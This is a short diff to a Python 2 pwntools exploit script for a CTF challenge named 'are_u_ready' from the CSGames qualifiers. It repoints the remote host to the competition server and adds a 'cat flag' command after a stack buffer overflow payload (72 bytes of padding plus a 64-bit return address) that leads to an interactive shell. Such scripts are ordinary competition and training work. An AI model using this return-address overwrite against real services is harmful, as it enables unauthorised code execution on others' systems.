@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 from pwn import *
 
-host = "67.205.174.218"
+host = "csgames-quals.frigon.app"
 port = 8000
 binary_path = "./are_u_ready"
 lib_path = None
@@ -32,5 +32,8 @@ payload += cyclic(72)
 payload += p64(target)
 
 p.sendlineafter("ARE YOU READY FOR THE CSGAMES ?!?!", payload)
+
+p.sendline("cat flag")
+
 p.interactive()
 
